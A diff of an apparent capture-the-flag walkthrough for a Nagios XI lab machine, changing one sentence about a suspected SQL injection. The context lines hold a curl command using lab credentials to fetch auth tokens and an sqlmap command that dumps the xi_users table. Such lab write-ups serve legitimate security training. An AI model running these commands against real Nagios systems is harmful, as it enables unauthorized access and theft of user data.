@@ -357,7 +357,7 @@ Alright! We are getting somewhere. I've tried a simple SQL injection in the ID p
 
 <img src="../figs/monitored7.png" alt="SQLi endpoint request">
 
-Amazing! It seems we might have a SQL injection here. Let's run SQLMap to test it. One thing I noticed though is that the auth_token can only be used once per request. This means we will need a command to pass a different auth_token for every SQLMap request. To do so, we'll use this `curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=500" | awk -F'"' '{print$12}'` command to clean the output to just be the token itself, and then run SQLMap with `-T xi_users`, which is the table in Nagios XI that contains users information.
+The error message indicates we might have a SQL injection here. Let's run SQLMap to test it. One thing I noticed though is that the auth_token can only be used once per request. This means we will need a command to pass a different auth_token for every SQLMap request. To do so, we'll use this `curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=500" | awk -F'"' '{print$12}'` command to clean the output to just be the token itself, and then run SQLMap with `-T xi_users`, which is the table in Nagios XI that contains users information.
 
 ```bash
 $ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=`curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=500" | awk -F'"' '{print$12}'`" --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users
